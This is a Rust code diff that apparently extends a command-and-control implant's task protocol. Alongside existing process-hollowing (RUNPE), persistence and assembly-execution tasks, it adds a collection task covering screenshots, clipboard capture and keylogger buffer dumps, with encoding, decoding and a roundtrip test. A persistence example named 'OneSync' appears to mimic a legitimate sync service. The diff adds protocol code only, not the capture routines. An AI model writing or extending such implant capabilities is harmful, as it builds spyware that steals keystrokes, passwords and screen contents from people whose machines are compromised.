@@ -39,6 +39,18 @@ pub mod task_kind {
     pub const RUNPE: u8 = 0x0B;
     /// Host persistence install/remove/list by mechanism (ABR-T030).
     pub const PERSIST: u8 = 0x0C;
+    /// Collection: screenshot, clipboard, keylog dump (ABR-T031).
+    pub const COLLECT: u8 = 0x0D;
+}
+
+/// Sub-actions of the COLLECT task kind (ABR-T031).
+pub mod collect_action {
+    /// Virtual-screen capture as PNG (BMP fallback), chunked result.
+    pub const SCREENSHOT: u8 = 0x00;
+    /// Clipboard text (CF_UNICODETEXT) at request time.
+    pub const CLIPBOARD: u8 = 0x01;
+    /// Return and clear the keylog buffer (sampled per beacon cycle).
+    pub const KEYLOG_DUMP: u8 = 0x02;
 }
 
 /// Sub-actions of the PERSIST task kind (ABR-T030).
@@ -194,6 +206,12 @@ pub enum TaskBody {
         name: String,
         exe: String,
         args: String,
+    },
+    /// Collection (ABR-T031): `action` selects screenshot / clipboard /
+    /// keylog dump; `arg` carries per-action parameters.
+    Collect {
+        action: u8,
+        arg: String,
     },
     Exit,
 }
@@ -402,6 +420,11 @@ impl Message {
                         put_str(&mut buf, exe);
                         put_str(&mut buf, args);
                     }
+                    TaskBody::Collect { action, arg } => {
+                        put_u8(&mut buf, task_kind::COLLECT);
+                        put_u8(&mut buf, *action);
+                        put_str(&mut buf, arg);
+                    }
                     TaskBody::ExecuteAssembly {
                         data,
                         type_name,
@@ -505,6 +528,10 @@ impl Message {
                         name: r.string()?,
                         exe: r.string()?,
                         args: r.string()?,
+                    },
+                    task_kind::COLLECT => TaskBody::Collect {
+                        action: r.u8()?,
+                        arg: r.string()?,
                     },
                     task_kind::EXECASM => TaskBody::ExecuteAssembly {
                         data: r.blob()?,
@@ -673,6 +700,13 @@ mod tests {
                 name: "OneSync".into(),
                 exe: String::new(),
                 args: "--bg".into(),
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 13,
+            body: TaskBody::Collect {
+                action: collect_action::SCREENSHOT,
+                arg: String::new(),
             },
         }));
         roundtrip(Message::TaskResult(TaskResult {
